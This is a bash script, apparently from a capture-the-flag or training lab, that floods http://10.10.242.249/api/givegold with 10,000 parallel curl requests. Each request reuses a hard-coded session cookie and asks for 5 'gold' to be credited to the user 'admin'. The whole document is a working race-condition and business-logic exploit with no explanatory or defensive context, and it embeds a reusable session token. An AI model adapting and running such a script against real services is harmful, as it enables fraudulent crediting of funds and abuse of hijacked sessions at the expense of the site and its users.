#!/bin/bash

for i in {1..10000}; do sleep .1; curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.242.249' -H $'Referer: http://10.10.242.249/giving.html' -H $'Connection: close' -H $'Cookie: connect.sid=s%3ARfJjsshEYiJJiV2D0lW8_RbVxVzwoz9y.b91fAo%2FjAluR4LkpRAHclgrhg3ay1KKTff5l1v1%2B18M' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3ARfJjsshEYiJJiV2D0lW8_RbVxVzwoz9y.b91fAo%2FjAluR4LkpRAHclgrhg3ay1KKTff5l1v1%2B18M' \
    --data-binary $'user=admin&amount=5' \
    $'http://10.10.242.249/api/givegold' & done